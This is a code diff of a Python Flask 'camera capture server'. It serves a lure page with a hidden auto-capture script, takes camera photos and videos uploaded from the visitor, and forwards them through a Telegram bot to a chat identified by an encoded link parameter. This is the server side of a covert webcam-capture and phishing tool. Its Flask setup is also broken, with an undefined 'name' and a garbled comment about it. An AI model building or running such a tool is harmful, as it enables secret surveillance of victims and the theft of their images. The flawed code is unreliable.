@@ -1,53 +1,43 @@
 import os
 import io
 import logging
-import base64
 from flask import Flask, request, render_template, abort, jsonify
 from dotenv import load_dotenv
-from werkzeug.utils import secure_filename
+from utils import decode_uid
 import telebot
+from werkzeug.utils import secure_filename
 
-# Load environment variables
+# Load environment variables from .env
 load_dotenv()
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 MAX_FILE_SIZE_MB = int(os.getenv("MAX_FILE_SIZE_MB", "12"))
 
 if not BOT_TOKEN:
-    raise RuntimeError("BOT_TOKEN not set in environment")
+    raise RuntimeError("BOT_TOKEN not set in environment.")
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# Flask app
+# FIX: name instead of name
 app = Flask(name, static_folder="static", template_folder="templates")
 app.config['MAX_CONTENT_LENGTH'] = MAX_FILE_SIZE_MB * 1024 * 1024
 
 logging.basicConfig(level=logging.INFO)
 
-# Helper to decode UID
-def decode_uid(uid_enc: str) -> str:
-    try:
-        return base64.urlsafe_b64decode(uid_enc.encode()).decode()
-    except Exception as e:
-        logging.error(f"Failed to decode uid: {e}")
-        raise
-
 @app.route("/")
 def index():
-    return "Camera capture server is running. Use /capture?uid=<encoded_id>"
+    return "Camera capture server. Use /capture?uid=<id>"
 
 @app.route("/capture")
 def capture_page():
     uid_enc = request.args.get("uid")
     if not uid_enc:
         return abort(400, "uid missing")
-
     try:
         user_id = decode_uid(uid_enc)
     except Exception:
         return abort(400, "invalid uid")
-
-    # Pass uid to the template so JS can send files
+    # Serve your background video + auto-capture script
     return render_template("index.html", uid=uid_enc)
 
 @app.route("/upload", methods=["POST"])
@@ -70,7 +60,7 @@ def upload_media():
     filename = secure_filename(f.filename) or f"{media_type}.bin"
     content = f.read()
 
-    logging.info(f"Received {media_type} from uid={uid_enc}: {len(content)} bytes")
+    logging.info("Received %s from uid=%s: %s bytes", media_type, uid_enc, len(content))
 
     try:
         bio = io.BytesIO(content)
@@ -89,7 +79,7 @@ def upload_media():
         else:
             bot.send_document(chat_id, bio)
     except Exception as e:
-        logging.exception("Failed to forward media to Telegram")
+        logging.exception("Failed to forward media to Telegram: %s", e)
         return jsonify({"status": "error", "error": str(e)}), 500
 
     return jsonify({"status": "ok"})
